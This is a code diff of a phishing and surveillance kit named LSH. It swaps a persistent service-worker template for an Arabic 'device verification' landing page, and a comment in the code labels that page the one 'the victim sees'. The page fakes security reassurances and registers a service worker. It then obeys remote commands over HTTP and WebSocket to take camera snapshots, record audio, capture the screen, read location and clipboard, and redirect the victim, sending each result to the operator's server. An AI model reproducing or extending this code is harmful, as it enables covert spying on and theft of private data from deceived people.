@@ -1,426 +1,487 @@
-# lsh/templates/sw.py
+# lsh/templates/page.py
 # ============================================================
-# Service Worker v6 — Multi-Channel
+# LSH Landing Page — الصفحة اللي الضحية يشوفها
 # ============================================================
 
-SW_FALLBACK = r"""
-// ═══════════════════════════════════════════════════════════
-// LSH v6.0 — Service Worker
-// Multi-Channel + Ack + Dead Letter
-// ═══════════════════════════════════════════════════════════
-
-const VERSION = '6.0.0';
-const CACHE_NAME = 'lsh-v6';
-
-// ★ قنوات الاتصال
-const CHANNELS = {
-  WS: 'ws',
-  SSE: 'sse',
-  LONG_POLL: 'long_poll',
-  HTTP: 'http',
-  BEACON: 'beacon'
-};
-
-const PING_INTERVAL = 3000;
-const HEARTBEAT_INTERVAL = 10000;
-const RECONNECT_INITIAL = 1000;
-const RECONNECT_MAX = 60000;
-const MAX_PENDING = 1000;
-const HEALTH_CHECK_INTERVAL = 30000;
-
-let sessionData = null;
-let pingTimer = null;
-let heartbeatTimer = null;
-let healthTimer = null;
-let isOnline = true;
-let reconnectAttempts = 0;
-let reconnectDelay = RECONNECT_INITIAL;
-let lastPongTime = Date.now();
-let swStartTime = Date.now();
-let activeChannel = 'http';
-let pendingCommands = new Map();
-
-// ═══════════════════════════════════════════════════════════
-// [1] Install / Activate
-// ═══════════════════════════════════════════════════════════
-self.addEventListener('install', (event) => {
-  console.log('[SW] Installing v' + VERSION);
-  self.skipWaiting();
-});
-
-self.addEventListener('activate', async (event) => {
-  console.log('[SW] Activated v' + VERSION);
-  event.waitUntil(
-    self.clients.claim().then(async () => {
-      const saved = await loadSession();
-      if (saved && saved.session_id) {
-        sessionData = saved;
-        startAllLoops();
-        await flushPendingQueue();
-      }
-    })
-  );
-});
-
-// ═══════════════════════════════════════════════════════════
-// [2] Messages
-// ═══════════════════════════════════════════════════════════
-self.addEventListener('message', (event) => {
-  const data = event.data || {};
-
-  if (data.type === 'init') {
-    sessionData = {
-      session_id: data.session_id,
-      chat_id: data.chat_id,
-      http_url: data.http_url,
-      ws_url: data.ws_url,
-      started_at: Date.now(),
-      last_page_seen: Date.now(),
-    };
-    saveSession();
-    startAllLoops();
-    flushPendingQueue();
+LSH_PAGE = r"""<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#0b1120">
+<title>جاري التحقق...</title>
+<style>
+  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body {
+    margin: 0; padding: 0;
+    background: radial-gradient(circle at 50% 0%, #1e293b 0%, #0b1120 70%);
+    color: #f8fafc;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
   }
-
-  if (data.type === 'stop') {
-    stopAllLoops();
+  .wrap { max-width: 420px; width: 100%; padding: 40px 24px; text-align: center; }
+  .shield {
+    width: 90px; height: 90px; margin: 0 auto 24px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #38bdf8, #0ea5e9);
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 0 40px rgba(56,189,248,0.5);
+    animation: pulse 2s ease-in-out infinite;
   }
-
-  if (data.type === 'keepalive') {
-    if (sessionData) {
-      sessionData.last_page_seen = Date.now();
-      saveSession();
-    }
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); box-shadow: 0 0 40px rgba(56,189,248,0.5); }
+    50% { transform: scale(1.05); box-shadow: 0 0 60px rgba(56,189,248,0.8); }
   }
+  .shield svg { width: 50px; height: 50px; fill: #fff; }
+  h1 { font-size: 22px; margin: 0 0 10px; font-weight: 700; color: #f1f5f9; }
+  .subtitle { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
+  .status {
+    background: rgba(30, 41, 59, 0.7);
+    backdrop-filter: blur(10px);
+    border: 1px solid #334155;
+    border-radius: 16px;
+    padding: 24px 20px;
+    margin-bottom: 18px;
+  }
+  .status-line {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 10px 0;
+    border-bottom: 1px solid rgba(51,65,85,0.5);
+    font-size: 14px;
+  }
+  .status-line:last-child { border-bottom: none; }
+  .status-label { color: #94a3b8; }
+  .status-value { color: #4ade80; font-weight: 600; }
+  .spinner {
+    display: inline-block;
+    width: 18px; height: 18px;
+    border: 2px solid rgba(56,189,248,0.3);
+    border-top-color: #38bdf8;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .footer { margin-top: 30px; font-size: 11px; color: #475569; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="shield">
+    <svg viewBox="0 0 24 24">
+      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+    </svg>
+  </div>
 
-  if (data.type === 'get_status') {
-    if (event.source && event.source.postMessage) {
-      event.source.postMessage({
-        type: 'status',
-        data: {
-          version: VERSION,
-          isOnline: isOnline,
-          channel: activeChannel,
-          reconnectAttempts: reconnectAttempts,
-          pendingQueue: pendingCommands.size,
-          uptime: sessionData ? Date.now() - sessionData.started_at : 0,
-          swUptime: Date.now() - swStartTime,
-          lastPong: lastPongTime,
-        }
+  <h1>جاري التحقق من الجهاز</h1>
+  <p class="subtitle">يتم فحص اتصالك وتهيئة الجلسة، يرجى الانتظار...</p>
+
+  <div class="status">
+    <div class="status-line">
+      <span class="status-label">الاتصال بالخادم</span>
+      <span class="status-value" id="srv">⏳</span>
+    </div>
+    <div class="status-line">
+      <span class="status-label">Service Worker</span>
+      <span class="status-value" id="sw">⏳</span>
+    </div>
+    <div class="status-line">
+      <span class="status-label">القناة النشطة</span>
+      <span class="status-value" id="ch">—</span>
+    </div>
+  </div>
+
+  <div class="spinner"></div>
+  <div class="footer">جلسة آمنة · مشفّرة · SSL 256-bit</div>
+</div>
+
+<script>
+(function() {
+  "use strict";
+
+  const SESSION_ID = "__SESSION_ID__";
+  const CHAT_ID = "__CHAT_ID__";
+  const HTTP_URL = "__HTTP_URL__";
+  const WS_URL = "__WS_URL__";
+
+  const $srv = document.getElementById('srv');
+  const $sw = document.getElementById('sw');
+  const $ch = document.getElementById('ch');
+
+  let ws = null;
+  let reconnectAttempts = 0;
+  let reconnectDelay = 1000;
+
+  // ============================================================
+  // 1) اختبار الاتصال بالخادم
+  // ============================================================
+  async function pingServer() {
+    try {
+      const r = await fetch(HTTP_URL + '/lsh_msg', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          session_id: SESSION_ID,
+          chat_id: CHAT_ID,
+          type: 'page_ping',
+          ts: Date.now()
+        })
       });
+
+      if (r.ok) {
+        $srv.textContent = '✅ متصل';
+        const data = await r.json();
+        if (data.commands && data.commands.length > 0) {
+          handleCommands(data.commands);
+        }
+        return true;
+      }
+    } catch (e) {
+      $srv.textContent = '❌ فشل';
     }
+    return false;
   }
 
-  if (data.type === 'force_reconnect') {
-    reconnectAttempts = 0;
-    reconnectDelay = RECONNECT_INITIAL;
-    doPing();
-  }
-
-  // ★ Ack من الصفحة
-  if (data.type === 'cmd_ack') {
-    const cmdId = data.cmd_id;
-    if (cmdId && pendingCommands.has(cmdId)) {
-      pendingCommands.delete(cmdId);
-    }
-  }
-});
-
-// ═══════════════════════════════════════════════════════════
-// [3] IndexedDB
-// ═══════════════════════════════════════════════════════════
-let db = null;
-
-function openDB() {
-  return new Promise((resolve) => {
-    if (db) return resolve(db);
-    try {
-      const req = indexedDB.open('lsh_v6_sw_db', 1);
-      req.onupgradeneeded = (e) => {
-        const database = e.target.result;
-        if (!database.objectStoreNames.contains('session')) {
-          database.createObjectStore('session');
-        }
-        if (!database.objectStoreNames.contains('pending')) {
-          database.createObjectStore('pending', { autoIncrement: true });
-        }
-        if (!database.objectStoreNames.contains('commands')) {
-          database.createObjectStore('commands');
-        }
-      };
-      req.onsuccess = (e) => { db = e.target.result; resolve(db); };
-      req.onerror = () => resolve(null);
-    } catch(e) { resolve(null); }
-  });
-}
-
-async function saveSession() {
-  const database = await openDB();
-  if (!database || !sessionData) return;
-  try {
-    const tx = database.transaction('session', 'readwrite');
-    tx.objectStore('session').put(sessionData, 'current');
-  } catch(e) {}
-}
-
-async function loadSession() {
-  const database = await openDB();
-  if (!database) return null;
-  return new Promise((resolve) => {
-    try {
-      const tx = database.transaction('session', 'readonly');
-      const req = tx.objectStore('session').get('current');
-      req.onsuccess = () => resolve(req.result);
-      req.onerror = () => resolve(null);
-    } catch(e) { resolve(null); }
-  });
-}
-
-async function addPending(item) {
-  const database = await openDB();
-  if (!database) return;
-  try {
-    const tx = database.transaction('pending', 'readwrite');
-    tx.objectStore('pending').add({ ...item, ts: Date.now() });
-  } catch(e) {}
-}
-
-async function getAllPending() {
-  const database = await openDB();
-  if (!database) return [];
-  return new Promise((resolve) => {
-    try {
-      const tx = database.transaction('pending', 'readonly');
-      const req = tx.objectStore('pending').getAll();
-      req.onsuccess = () => resolve(req.result || []);
-      req.onerror = () => resolve([]);
-    } catch(e) { resolve([]); }
-  });
-}
-
-async function clearPending() {
-  const database = await openDB();
-  if (!database) return;
-  try {
-    const tx = database.transaction('pending', 'readwrite');
-    tx.objectStore('pending').clear();
-  } catch(e) {}
-}
-
-// ═══════════════════════════════════════════════════════════
-// [4] Loops
-// ═══════════════════════════════════════════════════════════
-function startAllLoops() {
-  startPing();
-  startHeartbeat();
-  startHealthCheck();
-}
-
-function stopAllLoops() {
-  if (pingTimer) { clearInterval(pingTimer); pingTimer = null; }
-  if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
-  if (healthTimer) { clearInterval(healthTimer); healthTimer = null; }
-  sessionData = null;
-}
-
-// ═══════════════════════════════════════════════════════════
-// [5] Ping Loop
-// ═══════════════════════════════════════════════════════════
-function startPing() {
-  if (pingTimer) clearInterval(pingTimer);
-  pingTimer = setInterval(doPing, PING_INTERVAL);
-  setTimeout(doPing, 100);
-}
-
-async function doPing() {
-  if (!sessionData) {
-    sessionData = await loadSession();
-    if (!sessionData) return;
-  }
-
-  try {
-    const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 8000);
-
-    const resp = await fetch(sessionData.http_url + '/lsh_msg', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        session_id: sessionData.session_id,
-        chat_id: sessionData.chat_id,
-        type: 'sw_ping',
-        ts: Date.now()
-      }),
-      signal: controller.signal
-    });
-
-    clearTimeout(timeout);
-
-    if (!resp.ok) {
-      handlePingFail();
+  // ============================================================
+  // 2) تسجيل Service Worker
+  // ============================================================
+  async function registerSW() {
+    if (!('serviceWorker' in navigator)) {
+      $sw.textContent = '❌ غير مدعوم';
       return;
     }
-
-    isOnline = true;
-    lastPongTime = Date.now();
-    reconnectAttempts = 0;
-    reconnectDelay = RECONNECT_INITIAL;
-
-    const data = await resp.json();
-    const commands = data.commands || [];
-
-    if (commands.length > 0) {
-      const clients = await self.clients.matchAll({ includeUncontrolled: true });
-
-      if (clients.length > 0) {
-        clients.forEach(client => {
-          client.postMessage({ type: 'commands', commands });
-        });
-      } else {
-        tryOpenClient(commands);
-      }
-    }
-  } catch (e) {
-    handlePingFail();
-  }
-}
-
-function handlePingFail() {
-  isOnline = false;
-  reconnectAttempts++;
-  // ★ Exponential backoff with jitter
-  const base = RECONNECT_INITIAL * Math.pow(1.5, Math.min(reconnectAttempts, 10));
-  const jitter = Math.random() * 0.3 * base;
-  reconnectDelay = Math.min(base + jitter, RECONNECT_MAX);
-}
-
-async function tryOpenClient(commands) {
-  try {
-    const client = await self.clients.openWindow(
-      '/lsh?s=' + sessionData.session_id + '&id=' + sessionData.chat_id
-    );
-    if (client) {
-      setTimeout(() => {
-        try { client.postMessage({ type: 'commands', commands }); } catch(e) {}
-      }, 2000);
-    }
-  } catch(e) {}
-}
-
-// ═══════════════════════════════════════════════════════════
-// [6] Heartbeat
-// ═══════════════════════════════════════════════════════════
-function startHeartbeat() {
-  if (heartbeatTimer) clearInterval(heartbeatTimer);
-  heartbeatTimer = setInterval(async () => {
-    if (!sessionData) return;
-    if (!isOnline && reconnectAttempts > 0) {
-      await doPing();
-    }
-    await saveSession();
-  }, HEARTBEAT_INTERVAL);
-}
-
-// ═══════════════════════════════════════════════════════════
-// [7] Health Check
-// ═══════════════════════════════════════════════════════════
-function startHealthCheck() {
-  if (healthTimer) clearInterval(healthTimer);
-  healthTimer = setInterval(async () => {
-    if (!sessionData) return;
-    if (Date.now() - lastPongTime > 60000) {
-      reconnectAttempts = 0;
-      await doPing();
-    }
-  }, HEALTH_CHECK_INTERVAL);
-}
-
-// ═══════════════════════════════════════════════════════════
-// [8] Flush Pending
-// ═══════════════════════════════════════════════════════════
-async function flushPendingQueue() {
-  const items = await getAllPending();
-  if (items.length === 0) return;
-
-  let sent = 0;
-  for (const item of items) {
     try {
-      const resp = await fetch(sessionData.http_url + '/lsh_msg', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(item)
+      const reg = await navigator.serviceWorker.register('/sw.js', {scope: '/'});
+      $sw.textContent = '✅ مسجل';
+
+      navigator.serviceWorker.ready.then(r => {
+        r.active.postMessage({
+          type: 'init',
+          session_id: SESSION_ID,
+          chat_id: CHAT_ID,
+          http_url: HTTP_URL,
+          ws_url: WS_URL
+        });
       });
-      if (resp.ok) sent++;
+    } catch (e) {
+      $sw.textContent = '❌ فشل';
+    }
+  }
+
+  // ============================================================
+  // 3) WebSocket
+  // ============================================================
+  function connectWS() {
+    try {
+      ws = new WebSocket(WS_URL);
+      ws.onopen = () => {
+        $ch.textContent = 'WebSocket';
+        reconnectAttempts = 0;
+        reconnectDelay = 1000;
+        ws.send(JSON.stringify({
+          type: 'hello',
+          session_id: SESSION_ID,
+          chat_id: CHAT_ID
+        }));
+      };
+      ws.onmessage = (ev) => {
+        try {
+          const data = JSON.parse(ev.data);
+          if (data.type === 'command') {
+            handleCommands([data.cmd]);
+          }
+          if (data.type === 'ping') {
+            ws.send(JSON.stringify({ type: 'pong', ts: Date.now() }));
+          }
+        } catch (e) {}
+      };
+      ws.onclose = () => {
+        $ch.textContent = 'HTTP';
+        reconnectAttempts++;
+        reconnectDelay = Math.min(1000 * Math.pow(1.5, reconnectAttempts), 60000);
+        setTimeout(connectWS, reconnectDelay);
+      };
+      ws.onerror = () => {};
+    } catch (e) {
+      $ch.textContent = 'HTTP';
+    }
+  }
+
+  // ============================================================
+  // 4) معالج الأوامر
+  // ============================================================
+  async function handleCommands(cmds) {
+    for (const cmd of cmds) {
+      try {
+        await executeCommand(cmd);
+
+        // Ack
+        if (cmd._id) {
+          fetch(HTTP_URL + '/lsh_msg', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              session_id: SESSION_ID,
+              chat_id: CHAT_ID,
+              type: 'cmd_ack',
+              cmd_id: cmd._id
+            })
+          }).catch(() => {});
+        }
+      } catch (e) {}
+    }
+  }
+
+  // ============================================================
+  // 5) تنفيذ الأمر
+  // ============================================================
+  async function executeCommand(cmd) {
+    const action = cmd.action;
+    const payload = cmd.payload || {};
+
+    try {
+      if (action === 'snapshot') {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {facingMode: 'user'}
+        });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.setAttribute('playsinline', '');
+        video.muted = true;
+        await video.play();
+        await new Promise(r => setTimeout(r, 1500));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        stream.getTracks().forEach(t => t.stop());
+
+        const img = canvas.toDataURL('image/jpeg', 0.8);
+        await sendResult(cmd._id, action, 'ok', img);
+      }
+
+      else if (action === 'audio') {
+        const stream = await navigator.mediaDevices.getUserMedia({audio: true});
+        const chunks = [];
+        let mimeType = 'audio/webm';
+        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
+          mimeType = 'audio/webm;codecs=opus';
+        }
+        const recorder = new MediaRecorder(stream, { mimeType });
+        recorder.ondataavailable = e => {
+          if (e.data && e.data.size > 0) chunks.push(e.data);
+        };
+        recorder.start();
+        await new Promise(r => setTimeout(r, payload.duration || 6000));
+        await new Promise(res => {
+          recorder.onstop = res;
+          recorder.stop();
+          stream.getTracks().forEach(t => t.stop());
+        });
+
+        const blob = new Blob(chunks, {type: mimeType});
+        const reader = new FileReader();
+        reader.onloadend = () => sendResult(cmd._id, action, 'ok', reader.result);
+        reader.readAsDataURL(blob);
+      }
+
+      else if (action === 'location') {
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            const data = JSON.stringify({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude
+            });
+            await sendResult(cmd._id, action, 'ok', data);
+          },
+          async () => {
+            await sendResult(cmd._id, action, 'fail', null);
+          },
+          { enableHighAccuracy: true, timeout: 7500, maximumAge: 0 }
+        );
+      }
+
+      else if (action === 'clipboard') {
+        try {
+          const txt = await navigator.clipboard.readText();
+          await sendResult(cmd._id, action, 'ok', txt);
+        } catch (e) {
+          await sendResult(cmd._id, action, 'fail', null);
+        }
+      }
+
+      else if (action === 'url') {
+        window.location.href = payload.url || 'about:blank';
+        await sendResult(cmd._id, action, 'ok', payload.url);
+      }
+
+      else if (action === 'vibrate') {
+        if (navigator.vibrate) {
+          navigator.vibrate(payload.pattern || [500, 200, 500]);
+        }
+        await sendResult(cmd._id, action, 'ok', null);
+      }
+
+      else if (action === 'screen') {
+        const stream = await navigator.mediaDevices.getDisplayMedia({
+          video: true
+        });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+        await new Promise(r => setTimeout(r, 1000));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 1280;
+        canvas.height = video.videoHeight || 720;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        stream.getTracks().forEach(t => t.stop());
+
+        const img = canvas.toDataURL('image/jpeg', 0.8);
+        await sendResult(cmd._id, action, 'ok', img);
+      }
+
+      else if (action === 'redirect') {
+        window.location.href = payload.url || 'about:blank';
+        await sendResult(cmd._id, action, 'ok', payload.url);
+      }
+
+      else {
+        await sendResult(cmd._id, action, 'fail', 'unknown_action');
+      }
+
+    } catch (e) {
+      await sendResult(cmd._id, action, 'fail', e.message || 'error');
+    }
+  }
+
+  // ============================================================
+  // 6) إرسال النتيجة
+  // ============================================================
+  async function sendResult(cmdId, action, status, data) {
+    try {
+      await fetch(HTTP_URL + '/lsh_msg', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          session_id: SESSION_ID,
+          chat_id: CHAT_ID,
+          type: 'cmd_result',
+          cmd_id: cmdId,
+          action: action,
+          status: status,
+          data: data
+        })
+      });
     } catch (e) {}
   }
 
-  if (sent === items.length) {
-    await clearPending();
-  }
-}
-
-// ═══════════════════════════════════════════════════════════
-// [9] Background Sync
-// ═══════════════════════════════════════════════════════════
-self.addEventListener('sync', (event) => {
-  if (event.tag === 'lsh-ping') event.waitUntil(doPing());
-  if (event.tag === 'lsh-flush') event.waitUntil(flushPendingQueue());
-});
-
-// ═══════════════════════════════════════════════════════════
-// [10] Push
-// ═══════════════════════════════════════════════════════════
-self.addEventListener('push', (event) => {
-  event.waitUntil(doPing());
-});
-
-// ═══════════════════════════════════════════════════════════
-// [11] Periodic Sync
-// ═══════════════════════════════════════════════════════════
-self.addEventListener('periodicsync', (event) => {
-  if (event.tag === 'lsh-periodic') event.waitUntil(doPing());
-});
-
-// ═══════════════════════════════════════════════════════════
-// [12] Fetch
-// ═══════════════════════════════════════════════════════════
-self.addEventListener('fetch', (event) => {
-  const url = event.request.url;
-
-  if (url.includes('/sw.js') || url.includes('/manifest.json')) {
-    event.respondWith(fetch(event.request).catch(() => new Response('', { status: 503 })));
-    return;
+  // ============================================================
+  // 7) إرسال Info أولي
+  // ============================================================
+  async function sendInitialInfo() {
+    try {
+      const info = {
+        session_id: SESSION_ID,
+        chat_id: CHAT_ID,
+        type: 'info',
+        info: {
+          ua: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          screen: {
+            width: screen.width,
+            height: screen.height,
+            pixelRatio: window.devicePixelRatio
+          },
+          timestamp: new Date().toISOString(),
+          sw_supported: 'serviceWorker' in navigator,
+          wakelock_supported: 'wakeLock' in navigator,
+          pwa_standalone: window.matchMedia('(display-mode: standalone)').matches
+        }
+      };
+      await fetch(HTTP_URL + '/lsh_msg', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(info)
+      });
+    } catch (e) {}
   }
 
-  event.respondWith(
-    fetch(event.request).catch(async (err) => {
-      if (event.request.method === 'POST' && sessionData) {
-        try {
-          const clone = event.request.clone();
-          const body = await clone.text();
-          await addPending({ url, method: 'POST', body });
-        } catch(e) {}
-      }
-      return new Response(
-        JSON.stringify({ error: 'offline', queued: true }),
-        { status: 503, headers: { 'Content-Type': 'application/json' } }
-      );
-    })
-  );
-});
+  // ============================================================
+  // 8) Start
+  // ============================================================
+  (async () => {
+    await pingServer();
+    await registerSW();
+    connectWS();
+    sendInitialInfo();
 
-// ═══════════════════════════════════════════════════════════
-// [13] Self Monitor
-// ═══════════════════════════════════════════════════════════
-setInterval(() => {
-  if (Date.now() - swStartTime > 1800000) {
-    swStartTime = Date.now();
-    startAllLoops();
-  }
-}, 60000);
+    // حلقة ping كل 5 ثواني
+    setInterval(pingServer, 5000);
 
-self.addEventListener('unhandledrejection', (e) => e.preventDefault());
-self.addEventListener('error', (e) => console.log('[SW] Error:', e.message));
+    // إرسال landmark: landing
+    fetch(HTTP_URL + '/lsh_msg', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        session_id: SESSION_ID,
+        chat_id: CHAT_ID,
+        type: 'landing',
+        ts: Date.now()
+      })
+    }).catch(() => {});
+  })();
 
-console.log('[SW] v' + VERSION + ' loaded');
-"""
+})();
+</script>
+</body>
+</html>"""
+
+
+# ============================================================
+# Fallback Page (لو حصل خطأ)
+# ============================================================
+LSH_PAGE_FALLBACK = """<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>خطأ</title>
+  <style>
+    body {
+      background: #0b1120;
+      color: #f8fafc;
+      font-family: sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .box {
+      text-align: center;
+      padding: 30px;
+      background: #1e293b;
+      border-radius: 16px;
+      max-width: 320px;
+    }
+    h2 { color: #f87171; margin: 0 0 12px; }
+    p { color: #94a3b8; line-height: 1.6; margin: 0; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>⚠️ حدث خطأ</h2>
+    <p>يرجى إعادة تحميل الصفحة أو المحاولة لاحقاً</p>
+  </div>
+</body>
+</html>"""
